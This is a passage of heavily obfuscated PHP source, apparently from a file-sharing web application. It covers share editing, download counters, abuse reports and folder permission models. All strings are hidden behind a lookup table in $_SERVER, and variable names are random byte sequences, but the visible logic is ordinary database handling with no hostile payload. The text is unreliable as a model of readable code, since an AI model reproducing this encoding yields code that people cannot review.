numViewAdd($»î…öûŸ) { $Ô¥‹‚Ş¤ =& $_SERVER[±Ö‰ô½¯]; $¤óÏç–å = array($Ô¥‹‚Ş¤[2297] => $»î…öûŸ); $this->where($¤óÏç–å)->setAdd($Ô¥‹‚Ş¤[2294]); } public function numDownloadAdd($Áœ¶ÆùÇ) { $ÂîÓ—˜Ÿ =& $_SERVER[±Ö‰ô½¯]; $éï½Ğ›» = array($ÂîÓ—˜Ÿ[2297] => $Áœ¶ÆùÇ); $this->where($éï½Ğ›»)->setAdd($ÂîÓ—˜Ÿ[2295]); } protected function shareEdit($¿õáü¶ı, $‹ŞÔµ½Ş) { $”†Ä˜— =& $_SERVER[±Ö‰ô½¯]; $ß¡†‚Å¿ = $this->getInfo($¿õáü¶ı); if (!$ß¡†‚Å¿) { return !1; } if ($‹ŞÔµ½Ş[$”†Ä˜—[1504]] && $‹ŞÔµ½Ş[$”†Ä˜—[575]] == $”†Ä˜—[91]) { if ($‹ŞÔµ½Ş[$”†Ä˜—[1504]] == $ß¡†‚Å¿[$”†Ä˜—[1504]]) { unset($‹ŞÔµ½Ş[$”†Ä˜—[1504]]); } if ($‹ŞÔµ½Ş[$”†Ä˜—[1504]]) { $–¸à¿ÃÖ = $this->where(array($”†Ä˜—[2299] => $‹ŞÔµ½Ş[$”†Ä˜—[1504]]))->find(); if ($–¸à¿ÃÖ) { return !1; } if (!is_array($‹ŞÔµ½Ş[$”†Ä˜—[577]])) { $‹ŞÔµ½Ş[$”†Ä˜—[577]] = is_array($ß¡†‚Å¿[$”†Ä˜—[577]]) ? $ß¡†‚Å¿[$”†Ä˜—[577]] : array(); } if (!$‹ŞÔµ½Ş[$”†Ä˜—[577]][$”†Ä˜—[2300]]) { $‹ŞÔµ½Ş[$”†Ä˜—[577]][$”†Ä˜—[2300]] = $ß¡†‚Å¿[$”†Ä˜—[1504]]; $‹ŞÔµ½Ş[$”†Ä˜—[577]][$”†Ä˜—[2301]] = $”†Ä˜—[91]; } } } $this->_checkLinkShare($‹ŞÔµ½Ş, $ß¡†‚Å¿); $êõ£Ï¿Ÿ = array(); $÷šü”² = explode($”†Ä˜—[50], $”†Ä˜—[2302]); foreach ($÷šü”² as $ÊÌâùı™) { if (!array_key_exists($ÊÌâùı™, $‹ŞÔµ½Ş)) { continue; } $êõ£Ï¿Ÿ[$ÊÌâùı™] = $‹ŞÔµ½Ş[$ÊÌâùı™]; } $this->shareEventAdd($ß¡†‚Å¿[$”†Ä˜—[193]], $‹ŞÔµ½Ş, $”†Ä˜—[1511]); $this->where(array($”†Ä˜—[2297] => $¿õáü¶ı))->save($êõ£Ï¿Ÿ); if (isset($‹ŞÔµ½Ş[$”†Ä˜—[2286]])) { $this->_shareAuthSet($¿õáü¶ı, $‹ŞÔµ½Ş[$”†Ä˜—[2286]]); } return !0; } private function _checkLinkShare($¢Ïî’³ï, $é”åŸÏ) { $—Úğ–©õ =& $_SERVER[±Ö‰ô½¯]; if ($¢Ïî’³ï[$—Úğ–©õ[575]] != $—Úğ–©õ[91]) { return; } $İ²§ßÄ = $é”åŸÏ[$—Úğ–©õ[90]][$—Úğ–©õ[193]]; if ($é”åŸÏ[$—Úğ–©õ[90]][$—Úğ–©õ[33]] != $—Úğ–©õ[232]) { $ƒİà“¤© = $this->_folderReport($İ²§ßÄ); if (!$ƒİà“¤©) { return; } show_json(LNG($—Úğ–©õ[2303]) . $—Úğ–©õ[2304] . $ƒİà“¤©, !1); } $ˆù¿äêÎ = Model($—Úğ–©õ[930])->fileInfoGet($é”åŸÏ[$—Úğ–©õ[90]][$—Úğ–©õ[193]]); if (!$ˆù¿äêÎ) { return; } $óğÆøÜ® = $this->shareFileMeta($ˆù¿äêÎ[$—Úğ–©õ[554]]); if (isset($óğÆøÜ®[$—Úğ–©õ[452]]) && $óğÆøÜ®[$—Úğ–©õ[452]] == $—Úğ–©õ[91]) { show_json(LNG($—Úğ–©õ[2305]), !1); } } private function _folderReport($ù¤è‡«É) { $‰ÌÒöš‰ =& $_SERVER[±Ö‰ô½¯]; $š»¶Î–™ = array($‰ÌÒöš‰[554] => array($‰ÌÒöš‰[1128], 0), $‰ÌÒöš‰[847] => 3); $ôØ”ğ£“ = Model($‰ÌÒöš‰[2306])->where($š»¶Î–™)->field($‰ÌÒöš‰[554])->select(); if (!$ôØ”ğ£“) { return !1; } $ôØ”ğ£“ = array_to_keyvalue($ôØ”ğ£“, $‰ÌÒöš‰[12], $‰ÌÒöš‰[554]); $ò™ÂóÉÜ = $‰ÌÒöš‰[50] . $ù¤è‡«É . $‰ÌÒöš‰[50]; $š»¶Î–™ = array($‰ÌÒöš‰[554] => array($‰ÌÒöš‰[7], $ôØ”ğ£“), $‰ÌÒöš‰[601] => array($‰ÌÒöš‰[471], "\x25{$ò™ÂóÉÜ}\45"), $‰ÌÒöš‰[517] => 0); $¢…ªĞ  = Model($‰ÌÒöš‰[930])->where($š»¶Î–™)->field($‰ÌÒöš‰[2307])->find(); if (!$¢…ªĞ ) { return !1; } $–şÛË = substr($¢…ªĞ [$‰ÌÒöš‰[601]], strpos($¢…ªĞ [$‰ÌÒöš‰[601]], $ò™ÂóÉÜ)); $š»¶Î–™ = array($‰ÌÒöš‰[193] => array($‰ÌÒöš‰[7], trim($–şÛË, $‰ÌÒöš‰[50]))); $Ó˜æ¦£ = Model($‰ÌÒöš‰[930])->where($š»¶Î–™)->field($‰ÌÒöš‰[32])->select(); $µ§ÊÉó± = array_to_keyvalue($Ó˜æ¦£, $‰ÌÒöš‰[12], $‰ÌÒöš‰[32]); $µ§ÊÉó±[] = $¢…ªĞ [$‰ÌÒöš‰[32]]; return implode($‰ÌÒöš‰[8], $µ§ÊÉó±); } protected function remove($¨±øĞ±) { $›€­®„¯ =& $_SERVER[±Ö‰ô½¯]; $ÎÖ×®µ¸ = is_array($¨±øĞ±) ? $¨±øĞ± : array($¨±øĞ±); for ($Ûİù„šÛ = 0; $Ûİù„šÛ < count($ÎÖ×®µ¸); $Ûİù„šÛ++) { $†áºôä“ = $this->getInfo($ÎÖ×®µ¸[$Ûİù„šÛ]); if ($†áºôä“[$›€­®„¯[683]] == $›€­®„¯[91]) { Model($›€­®„¯[653])->eventShare($†áºôä“[$›€­®„¯[193]], $›€­®„¯[2292]); } if ($†áºôä“[$›€­®„¯[575]] == $›€­®„¯[91]) { Model($›€­®„¯[653])->eventShare($†áºôä“[$›€­®„¯[193]], $›€­®„¯[2291]); } } $—’èÄ“ = array($›€­®„¯[685] => array($›€­®„¯[7], $ÎÖ×®µ¸)); $±³úá€ = $this->where($—’èÄ“)->delete(); if ($±³úá€) { Model($›€­®„¯[686])->where($—’èÄ“)->delete(); } return $±³úá€; } protected function removeBySource($€Ë†ß¹Ş) { $õ÷Ù÷Ä =& $_SERVER[±Ö‰ô½¯]; $ƒÙÁß›í = array($õ÷Ù÷Ä[503] => array($õ÷Ù÷Ä[504], $€Ë†ß¹Ş)); $¤‹°íŠ = $this->field($õ÷Ù÷Ä[685])->where($ƒÙÁß›í)->select(); $ê´ ¶ù = array_to_keyvalue($¤‹°íŠ, $õ÷Ù÷Ä[12], $õ÷Ù÷Ä[685]); if (!$ê´ ¶ù) { return; } foreach ($¤‹°íŠ as $şòº­á€) { $this->shareInfoMofify($şòº­á€, $õ÷Ù÷Ä[2308]); } $ƒÙÁß›í = array($õ÷Ù÷Ä[2297] => array($õ÷Ù÷Ä[504], $ê´ ¶ù)); $this->where($ƒÙÁß›í)->delete(); Model($õ÷Ù÷Ä[686])->where($ƒÙÁß›í)->delete(); } public function listAll($ÉÊæÔÄŠ) { $¸÷è–¤ˆ =& $_SERVER[±Ö‰ô½¯]; $ã½Çªåæ = array(); if ($ÉÊæÔÄŠ[$¸÷è–¤ˆ[1542]]) { $ã½Çªåæ[$¸÷è–¤ˆ[1542]] = $ÉÊæÔÄŠ[$¸÷è–¤ˆ[1542]]; } if ($ÉÊæÔÄŠ[$¸÷è–¤ˆ[858]]) { $ö†óÒÎõ = $ÉÊæÔÄŠ[$¸÷è–¤ˆ[859]] ? $ÉÊæÔÄŠ[$¸÷è–¤ˆ[859]] : strtotime(date($¸÷è–¤ˆ[2309])); $ã½Çªåæ[$¸÷è–¤ˆ[233]] = array($¸÷è–¤ˆ[410], array($ÉÊæÔÄŠ[$¸÷è–¤ˆ[858]], $ö†óÒÎõ)); } if ($ÉÊæÔÄŠ[$¸÷è–¤ˆ[33]]) { $ã½Çªåæ[$ÉÊæÔÄŠ[$¸÷è–¤ˆ[33]]] = 1; } else { $ã½Çªåæ[] = array($¸÷è–¤ˆ[575] => array($¸÷è–¤ˆ[1128], 0), $¸÷è–¤ˆ[683] => array($¸÷è–¤ˆ[1128], 0), $¸÷è–¤ˆ[2280] => $¸÷è–¤ˆ[2236]); } if ($ÉÊæÔÄŠ[$¸÷è–¤ˆ[2232]]) { $ã½Çªåæ[] = array($¸÷è–¤ˆ[1504] => $ÉÊæÔÄŠ[$¸÷è–¤ˆ[2232]], $¸÷è–¤ˆ[1815] => array($¸÷è–¤ˆ[471], "\45{$ÉÊæÔÄŠ[$¸÷è–¤ˆ[2232]]}\x25"), $¸÷è–¤ˆ[2280] => $¸÷è–¤ˆ[2236]); } $ßÒŠõ = $this->_makeOrder()->where($ã½Çªåæ)->selectPage(20); if (empty($ßÒŠõ[$¸÷è–¤ˆ[447]])) { return array(); } $this->_listDataApply($ßÒŠõ[$¸÷è–¤ˆ[447]]); return $ßÒŠõ; } public function listDataApply($‚„ÅÑ‹±) { $this->_listDataApply($‚„ÅÑ‹±); return $‚„ÅÑ‹±; } private function _listDataApply(&$ÂØ˜Ò®‚) { $ğæŠ¡ïŒ =& $_SERVER[±Ö‰ô½¯]; $ö¤›ğĞó = array_to_keyvalue($ÂØ˜Ò®‚, $ğæŠ¡ïŒ[12], $ğæŠ¡ïŒ[1542]); $š’Ãó‰¦ = Model($ğæŠ¡ïŒ[614])->userListInfo(array_unique($ö¤›ğĞó)); $É³‘Ÿü¨ = array_to_keyvalue($ÂØ˜Ò®‚, $ğæŠ¡ïŒ[12], $ğæŠ¡ïŒ[193]); $ÁÛäèËó = Model($ğæŠ¡ïŒ[930])->sourceListInfo($É³‘Ÿü¨, !0); foreach ($ÂØ˜Ò®‚ as $¬ğÛî÷º => &$ã´´ñ­) { $¹ì½¾ÃÅ = $ã´´ñ­[$ğæŠ¡ïŒ[1542]]; $ã´´ñ­[$ğæŠ¡ïŒ[2310]] = $š’Ãó‰¦[$¹ì½¾ÃÅ] ? $š’Ãó‰¦[$¹ì½¾ÃÅ] : !1; if (!$ã´´ñ­[$ğæŠ¡ïŒ[2310]] || $ã´´ñ­[$ğæŠ¡ïŒ[2310]][$ğæŠ¡ïŒ[847]] != $ğæŠ¡ïŒ[91]) { unset($ÂØ˜Ò®‚[$¬ğÛî÷º]); continue; } $›Íş ² = $ã´´ñ­[$ğæŠ¡ïŒ[193]]; $ã´´ñ­[$ğæŠ¡ïŒ[90]] = $ÁÛäèËó[$›Íş ²] ? $ÁÛäèËó[$›Íş ²] : !1; if ($ã´´ñ­[$ğæŠ¡ïŒ[90]][$ğæŠ¡ïŒ[517]] == $ğæŠ¡ïŒ[91]) { unset($ÂØ˜Ò®‚[$¬ğÛî÷º]); } if ($ã´´ñ­[$ğæŠ¡ïŒ[90]] != $ğæŠ¡ïŒ[230] && !$ã´´ñ­[$ğæŠ¡ïŒ[90]]) { unset($ÂØ˜Ò®‚[$¬ğÛî÷º]); } } unset($ã´´ñ­); $ÂØ˜Ò®‚ = array_values($ÂØ˜Ò®‚); } private function _makeOrder($ï‹àĞ÷Á = '') { $˜…€üûï =& $_SERVER[±Ö‰ô½¯]; $Øã¼ìğå = array($˜…€üûï[233], $˜…€üûï[859], $˜…€üûï[2294], $˜…€üûï[2295]); $ìµûàÜê = array($˜…€üûï[534] => $˜…€üûï[535], $˜…€üûï[536] => $˜…€üûï[537]); $ø…Ñ½Ïó = Input::get($˜…€üûï[541], $˜…€üûï[7], $˜…€üûï[509], $Øã¼ìğå); $€Š´Ê› = Input::get($˜…€üûï[542], $˜…€üûï[7], $˜…€üûï[2311], array($˜…€üûï[2229], $˜…€üûï[536])); $€Š´Ê› = $ìµûàÜê[$€Š´Ê›]; $ï‹àĞ÷Á = $ï‹àĞ÷Á . "{$ø…Ñ½Ïó}\x20{$€Š´Ê›}"; return $this->order($ï‹àĞ÷Á); } public function reportAdd($â†èš”) { $åÊ—éáı =& $_SERVER[±Ö‰ô½¯]; $Ôº¯ü¡’ = array($åÊ—éáı[685] => $â†èš”[$åÊ—éáı[685]], $åÊ—éáı[1542] => USER_ID); if (Model($åÊ—éáı[2306])->where($Ôº¯ü¡’)->find()) { return !1; } $²‘õ™²¯ = array($åÊ—éáı[685] => $â†èš”[$åÊ—éáı[685]], $åÊ—éáı[1815] => $â†èš”[$åÊ—éáı[1815]], $åÊ—éáı[193] => $â†èš”[$åÊ—éáı[193]], $åÊ—éáı[554] => $â†èš”[$åÊ—éáı[554]], $åÊ—éáı[1542] => USER_ID, $åÊ—éáı[33] => $â†èš”[$åÊ—éáı[33]], $åÊ—éáı[537] => $â†èš”[$åÊ—éáı[537]]); return Model($åÊ—éáı[2306])->add($²‘õ™²¯); } public function reportList($ù…ù‚Ì) { $ÎÖÕ‡ó =& $_SERVER[±Ö‰ô½¯]; $­¶†„…› = array(); if ($ù…ù‚Ì[$ÎÖÕ‡ó[858]]) { $³ÍÙèé = $ù…ù‚Ì[$ÎÖÕ‡ó[859]] ? $ù…ù‚Ì[$ÎÖÕ‡ó[859]] : strtotime(date($ÎÖÕ‡ó[2309])); $­¶†„…›[$ÎÖÕ‡ó[233]] = array($ÎÖÕ‡ó[410], array($ù…ù‚Ì[$ÎÖÕ‡ó[858]], $³ÍÙèé)); } if (isset($ù…ù‚Ì[$ÎÖÕ‡ó[33]]) && in_array($ù…ù‚Ì[$ÎÖÕ‡ó[33]], array($ÎÖÕ‡ó[91], $ÎÖÕ‡ó[521], $ÎÖÕ‡ó[2312], $ÎÖÕ‡ó[2313], $ÎÖÕ‡ó[2314]))) { $­¶†„…›[$ÎÖÕ‡ó[33]] = $ù…ù‚Ì[$ÎÖÕ‡ó[33]]; } if (isset($ù…ù‚Ì[$ÎÖÕ‡ó[847]]) && in_array($ù…ù‚Ì[$ÎÖÕ‡ó[847]], array($ÎÖÕ‡ó[230], $ÎÖÕ‡ó[91], $ÎÖÕ‡ó[521], $ÎÖÕ‡ó[2312]))) { $­¶†„…›[$ÎÖÕ‡ó[847]] = $ù…ù‚Ì[$ÎÖÕ‡ó[847]]; } $™»ºŠª = Input::get($ÎÖÕ‡ó[542], $ÎÖÕ‡ó[7], $ÎÖÕ‡ó[2311], array($ÎÖÕ‡ó[2229], $ÎÖÕ‡ó[536])); $Ÿ÷×ß×‹ = array($ÎÖÕ‡ó[534] => $ÎÖÕ‡ó[535], $ÎÖÕ‡ó[536] => $ÎÖÕ‡ó[537]); $óÓ¨Ñè‚ = $ÎÖÕ‡ó[2315] . $Ÿ÷×ß×‹[$™»ºŠª]; $éèÏì‚ = Model($ÎÖÕ‡ó[2306])->where($­¶†„…›)->order($óÓ¨Ñè‚)->selectPage(20); if (empty($éèÏì‚[$ÎÖÕ‡ó[447]])) { return array(); } $Ì’·à = array_to_keyvalue_group($éèÏì‚[$ÎÖÕ‡ó[447]], $ÎÖÕ‡ó[847], $ÎÖÕ‡ó[685]); if (!empty($Ì’·à[0])) { $ù…ù‚Ì = $Ì’·à[0]; $­¶†„…› = array($ÎÖÕ‡ó[685] => array($ÎÖÕ‡ó[7], $ù…ù‚Ì)); $ë×ÖÍå• = $this->where($­¶†„…›)->field($ÎÖÕ‡ó[685])->select(); $ë×ÖÍå• = array_to_keyvalue($ë×ÖÍå•, $ÎÖÕ‡ó[12], $ÎÖÕ‡ó[685]); $øÉ²ÛÂÔ = array_diff($ù…ù‚Ì, $ë×ÖÍå•); if (!empty($øÉ²ÛÂÔ)) { foreach ($éèÏì‚[$ÎÖÕ‡ó[447]] as $üˆŸ’ö => $Üù›šË) { if (in_array($Üù›šË[$ÎÖÕ‡ó[685]], $øÉ²ÛÂÔ)) { unset($éèÏì‚[$ÎÖÕ‡ó[447]][$üˆŸ’ö]); } } } } $this->_listDataApply($éèÏì‚[$ÎÖÕ‡ó[447]]); return $éèÏì‚; } public function reportStatus($Ö©ù÷É¦) { $´½Ÿ»ì =& $_SERVER[±Ö‰ô½¯]; $íÆ…£Ü³ = array($´½Ÿ»ì[484] => $Ö©ù÷É¦[$´½Ÿ»ì[484]]); $“èï¦çÇ = Model($´½Ÿ»ì[2306])->where($íÆ…£Ü³)->field($´½Ÿ»ì[2316])->find(); if (!$“èï¦çÇ) { return !1; } $ë…óâ»— = array($´½Ÿ»ì[847] => $Ö©ù÷É¦[$´½Ÿ»ì[847]]); if ($Ö©ù÷É¦[$´½Ÿ»ì[847]] == $´½Ÿ»ì[2312] && $“èï¦çÇ[$´½Ÿ»ì[847]] == $´½Ÿ»ì[2312]) { $ë…óâ»—[$´½Ÿ»ì[847]] = 0; } $·”ø»’ = Model($´½Ÿ»ì[2306])->where($íÆ…£Ü³)->save($ë…óâ»—); if ($Ö©ù÷É¦[$´½Ÿ»ì[847]] == $´½Ÿ»ì[521]) { if ($“èï¦çÇ[$´½Ÿ»ì[554]] != $´½Ÿ»ì[230] && $this->shareFileMeta($“èï¦çÇ[$´½Ÿ»ì[554]])) { $this->shareFileMeta($“èï¦çÇ[$´½Ÿ»ì[554]], 0); } $this->remove($“èï¦çÇ[$´½Ÿ»ì[685]]); return !0; } if ($·”ø»’ && $Ö©ù÷É¦[$´½Ÿ»ì[847]] == $´½Ÿ»ì[2312]) { $—×íª“ì = $ë…óâ»—[$´½Ÿ»ì[847]] == $´½Ÿ»ì[2312] ? 1 : 0; $this->shareFileMeta($“èï¦çÇ[$´½Ÿ»ì[554]], $—×íª“ì); $this->removeByFile($“èï¦çÇ[$´½Ÿ»ì[554]]); } return $·”ø»’; } private function removeByFile($”íÆÉÃº) { $µ¦Ï‘„Î =& $_SERVER[±Ö‰ô½¯]; $‹ôĞõñÃ = Model($µ¦Ï‘„Î[930])->where(array($µ¦Ï‘„Î[554] => $”íÆÉÃº))->field($µ¦Ï‘„Î[193])->select(); $ûÁÊ©€ = array_to_keyvalue($‹ôĞõñÃ, $µ¦Ï‘„Î[12], $µ¦Ï‘„Î[193]); $É¤¾‹€ = array($µ¦Ï‘„Î[193] => array($µ¦Ï‘„Î[7], $ûÁÊ©€), $µ¦Ï‘„Î[575] => 1); $‹ôĞõñÃ = $this->where($É¤¾‹€)->field($µ¦Ï‘„Î[685])->select(); if (empty($‹ôĞõñÃ)) { return; } $¿ÈÕ—©î = array_to_keyvalue($‹ôĞõñÃ, $µ¦Ï‘„Î[12], $µ¦Ï‘„Î[685]); $this->remove($¿ÈÕ—©î); } private function shareFileMeta($ìºÎÈ¤, $òû¡±½ = null) { $¢Ü™¯µ… =& $_SERVER[±Ö‰ô½¯]; $çù¢äìŠ = array($¢Ü™¯µ…[554] => $ìºÎÈ¤, $¢Ü™¯µ…[95] => $¢Ü™¯µ…[2317]); if (is_null($òû¡±½)) { return Model($¢Ü™¯µ…[2318])->where($çù¢äìŠ)->find(); } $çù¢äìŠ[$¢Ü™¯µ…[452]] = $òû¡±½; Model($¢Ü™¯µ…[2318])->add($çù¢äìŠ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\x72\143\x65\x5f\x61\x75\x74\150"; public function getAuth($Í©ÚË×) { $Û²¡óÊİ =& $_SERVER[±Ö‰ô½¯]; $å±İÊÓß = $this->sourceAuthSelect($Í©ÚË×); $³ÈºÀ¬ = array(); $»Á‘«ß÷ = array(); $Š™ü›± = 2 << 25; foreach ($å±İÊÓß as $ß¬Àïì) { $©Á·ŞŞî = Model($Û²¡óÊİ[588])->listData($ß¬Àïì[$Û²¡óÊİ[1589]]); if (!$©Á·ŞŞî) { continue; } $³ÈºÀ¬[] = $ß¬Àïì; $«Ş­˜í = 0; if ($ß¬Àïì[$Û²¡óÊİ[190]] == SourceModel::TYPE_GROUP) { $«Ş­˜í = $Š™ü›± * 2; } if ($ß¬Àïì[$Û²¡óÊİ[190]] == SourceModel::TYPE_USER) { $«Ş­˜í = $Š™ü›±; } if ($ß¬Àïì[$Û²¡óÊİ[190]] == SourceModel::TYPE_USER && $ß¬Àïì[$Û²¡óÊİ[586]] == $Û²¡óÊİ[230]) { $«Ş­˜í = 0; } $»Á‘«ß÷[] = $©Á·ŞŞî[$Û²¡óÊİ[499]] + $«Ş­˜í; } array_multisort($»Á‘«ß÷, SORT_DESC, $³ÈºÀ¬); return $³ÈºÀ¬; } public function sourceAuthSelect($ıÉİ™§) { $²ØÂ·µˆ =& $_SERVER[±Ö‰ô½¯]; static $·‘ÛÙí„ = array(); $¨ºÍıŠÛ = is_array($ıÉİ™§) ? !1 : !0; if ($¨ºÍıŠÛ) { $ıÉİ™§ = array($ıÉİ™§); } $ÒŒÙíåô = array(); foreach ($ıÉİ™§ as $¬™¤Ô­”) { if (isset($·‘ÛÙí„[$¬™¤Ô­”])) { $ÒŒÙíåô[$¬™¤Ô­”] = $·‘ÛÙí„[$¬™¤Ô­”]; } } if (count($ÒŒÙíåô) == count($ıÉİ™§)) { return $¨ºÍıŠÛ ? $ÒŒÙíåô[$ıÉİ™§[0]] : $ÒŒÙíåô; } $ì“¥Ä¥ = $²ØÂ·µˆ[2319]; $ã¼İ‚›° = array($²ØÂ·µˆ[193] => array($²ØÂ·µˆ[7], $ıÉİ™§)); $×ŞäÍ§é = $this->field($ì“¥Ä¥)->order($²ØÂ·µˆ[484])->where($ã¼İ‚›°)->select(); $ ÏÁ†¯ = array_to_keyvalue_group($×ŞäÍ§é, $²ØÂ·µˆ[193]); foreach ($ıÉİ™§ as $¬™¤Ô­”) { $·‘ÛÙí„[$¬™¤Ô­”] = $ ÏÁ†¯[$¬™¤Ô­”] ? $ ÏÁ†¯[$¬™¤Ô­”] : array(); } if ($¨ºÍıŠÛ) { return $×ŞäÍ§é; } return $ ÏÁ†¯; } public function setAuth($ÀšÚİ•», $¹ª¢Û‚Ë) { $øÉÙ¢Âş =& $_SERVER[±Ö‰ô½¯]; $ôñŸÔ¯ = Model($øÉÙ¢Âş[1482])->sourceInfo($ÀšÚİ•»); if (!$ôñŸÔ¯) { return !1; } if ($ôñŸÔ¯[$øÉÙ¢Âş[190]] != SourceModel::TYPE_GROUP) { return !1; } $Î–Ùú¼ = 1; $ö»æ­ı = $ôñŸÔ¯[$øÉÙ¢Âş[586]]; if ($ö»æ­ı != $Î–Ùú¼) { $úÇ»‘äú = array($øÉÙ¢Âş[1444] => $ö»æ­ı); $×–ºâ‘’ = Model($øÉÙ¢Âş[2228])->field($øÉÙ¢Âş[1542])->where($úÇ»‘äú)->select(); $×–ºâ‘’ = array_to_keyvalue($×–ºâ‘’, $øÉÙ¢Âş[12], $øÉÙ¢Âş[1542]); } $ÁÊŞÛğÙ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¬Èû¸¶ä = array(); foreach ($¹ª¢Û‚Ë as $ÂëŸî£ü) { if (!in_array($ÂëŸî£ü[$øÉÙ¢Âş[190]], $ÁÊŞÛğÙ)) { show_json(LNG($øÉÙ¢Âş[2320]), !1); } if ($ö»æ­ı != $Î–Ùú¼) { if ($ÂëŸî£ü[$øÉÙ¢Âş[190]] == SourceModel::TYPE_GROUP) { } if ($ÂëŸî£ü[$øÉÙ¢Âş[586]] != 0 && !in_array($ÂëŸî£ü[$øÉÙ¢Âş[586]], $×–ºâ‘’)) { } } if ($ÂëŸî£ü[$øÉÙ¢Âş[586]] == 0) { $ÂëŸî£ü[$øÉÙ¢Âş[190]] = SourceModel::TYPE_USER; } $¬Èû¸¶ä[] = array($øÉÙ¢Âş[193] => $ÀšÚİ•», $øÉÙ¢Âş[190] => intval($ÂëŸî£ü[$øÉÙ¢Âş[190]]), $øÉÙ¢Âş[586] => intval($ÂëŸî£ü[$øÉÙ¢Âş[586]]), $øÉÙ¢Âş[1589] => intval($ÂëŸî£ü[$øÉÙ¢Âş[1589]]) ? intval($ÂëŸî£ü[$øÉÙ¢Âş[1589]]) : 0, $øÉÙ¢Âş[2298] => intval($ÂëŸî£ü[$øÉÙ¢Âş[2298]]) ? intval($ÂëŸî£ü[$øÉÙ¢Âş[2298]]) : -1); } $this->where(array($øÉÙ¢Âş[503] => $ÀšÚİ•»))->delete(); $this->addAll($¬Èû¸¶ä); return !0; } public function authClear($Ò§»éÚŸ) { $—¼Œ¼¥· =& $_SERVER[±Ö‰ô½¯]; $™çµ„Ôï = Model($—¼Œ¼¥·[1482])->sourceInfo($Ò§»éÚŸ); $…Ò˜ü‰ò = array($Ò§»éÚŸ); if ($™çµ„Ôï[$—¼Œ¼¥·[497]] == $—¼Œ¼¥·[91]) { $ŸÂÜÍüÎ = array($—¼Œ¼¥·[672] => array($—¼Œ¼¥·[632], $™çµ„Ôï[$—¼Œ¼¥·[601]] . $Ò§»éÚŸ . $—¼Œ¼¥·[633])); $…Ò˜ü‰ò = Model($—¼Œ¼¥·[1482])->field($—¼Œ¼¥·[503])->where($ŸÂÜÍüÎ)->getField($—¼Œ¼¥·[193], !0); $…Ò˜ü‰ò[] = $Ò§»éÚŸ; } $this->where(array($—¼Œ¼¥·[503] => array($—¼Œ¼¥·[504], $…Ò˜ü‰ò)))->delete(); return !0; } public function getAllParent($ÕŒÔ´ä™) { $¤úÙñ Ç =& $_SERVER[±Ö‰ô½¯]; $Ô•œîÍâ = Model($¤úÙñ Ç[1482])->sourceInfo($ÕŒÔ´ä™); if (!$Ô•œîÍâ || $Ô•œîÍâ[$¤úÙñ Ç[190]] != SourceModel::TYPE_GROUP) { return array(); } $ê¿×Ñšè = Model($¤úÙñ Ç[1482])->parentLevelArray($Ô•œîÍâ[$¤úÙñ Ç[601]]); $†¥ÓãÂ½ = array_merge(array(intval($ÕŒÔ´ä™)), array_reverse($ê¿×Ñšè)); $½ŠõŒòÈ = $this->sourceAuthSelect($†¥ÓãÂ½); $ şäÄ ú = $GLOBALS[$¤úÙñ Ç[6]][$¤úÙñ Ç[92]][$¤úÙñ Ç[2241]] == 1; $ëÎ¡øÒˆ = $ şäÄ ú ? 3 : 2; $“àÕÎ®Ë = Model($¤úÙñ Ç[1442])->getInfo($Ô•œîÍâ[$¤úÙñ Ç[586]]); $Ò·²»ÕÓ = explode($¤úÙñ Ç[50], trim($“àÕÎ®Ë[$¤úÙñ Ç[601]], $¤úÙñ Ç[50])); $Ğ›µÍ€ì = array_merge(array($“àÕÎ®Ë[$¤úÙñ Ç[1444]]), array_reverse(array_slice($Ò·²»ÕÓ, $ëÎ¡øÒˆ))); foreach ($½ŠõŒòÈ as $ÕŒÔ´ä™ => $ÕŒ›ï»ˆ) { foreach ($ÕŒ›ï»ˆ as $Ä‚ÅèÒ) { if (!$Ä‚ÅèÒ || !$Ä‚ÅèÒ[$¤úÙñ Ç[586]] || $Ä‚ÅèÒ[$¤úÙñ Ç[586]] == $¤úÙñ Ç[230]) { continue; } if ($Ä‚ÅèÒ[$¤úÙñ Ç[190]] != SourceModel::TYPE_GROUP) { continue; } $Ğ›µÍ€ì[] = $Ä‚ÅèÒ[$¤úÙñ Ç[586]]; } } $Ğ›µÍ€ì = array_unique($Ğ›µÍ€ì); $äµµ÷Ğ¹ = array($¤úÙñ Ç[430] => _get($GLOBALS[$¤úÙñ Ç[7]], $¤úÙñ Ç[430], 1), $¤úÙñ Ç[441] => _get($GLOBALS[$¤úÙñ Ç[7]], $¤úÙñ Ç[441], 500)); $GLOBALS[$¤úÙñ Ç[7]][$¤úÙñ Ç[430]] = 1; $GLOBALS[$¤úÙñ Ç[7]][$¤úÙñ Ç[441]] = 500; $ÇŸ÷œ÷Ò = array($¤úÙñ Ç[505] => 0, $¤úÙñ Ç[2142] => AuthModel::authAll(), $¤úÙñ Ç[506] => LNG($¤úÙñ Ç[2321]), $¤úÙñ Ç[2157] => $¤úÙñ Ç[2322]); $ÙÒôµŠœ = array(); $ãíÌú… = explode($¤úÙñ Ç[50], $¤úÙñ Ç[2323]); $Í†ñÍ¶ = explode($¤úÙñ Ç[50], $¤úÙñ Ç[2324]); foreach ($Ğ›µÍ€ì as $Öƒ«ßˆ) { $½®ëšç­ = Model($¤úÙñ Ç[1442])->getInfo($Öƒ«ßˆ); $ú»®Š¾Ú = array_field_key($½®ëšç­, $ãíÌú…); $ìÕ³ë² = Model($¤úÙñ Ç[614])->listByGroup($Öƒ«ßˆ); foreach ($ìÕ³ë²[$¤úÙñ Ç[447]] as $Ú¥…êĞÔ => $ì•ìÆÓ) { $this->userGroupList($ì•ìÆÓ[$¤úÙñ Ç[1542]], $ì•ìÆÓ); $›­›äÊ« = $ì•ìÆÓ[$¤úÙñ Ç[1542]] . $¤úÙñ Ç[12]; if (isset($ÙÒôµŠœ[$›­›äÊ«])) { continue; } $¦ûì·„© = Model($¤úÙñ Ç[2325])->listData($ì•ìÆÓ[$¤úÙñ Ç[2326]]); $ì•ìÆÓ[$¤úÙñ Ç[2327]] = Action($¤úÙñ Ç[2328])->parseUrl($ì•ìÆÓ[$¤úÙñ Ç[2327]]); $ì•ìÆÓ[$¤úÙñ Ç[1895]] = $¦ûì·„© && $¦ûì·„©[$¤úÙñ Ç[2329]] == 1; $Ğãşé¹’ = $this->groupRootAuth($Öƒ«ßˆ, $ì•ìÆÓ[$¤úÙñ Ç[1542]]); $Ğãşé¹’ = $ì•ìÆÓ[$¤úÙñ Ç[1895]] ? $ÇŸ÷œ÷Ò : $Ğãşé¹’; $ÙÒôµŠœ[$›­›äÊ«] = array($¤úÙñ 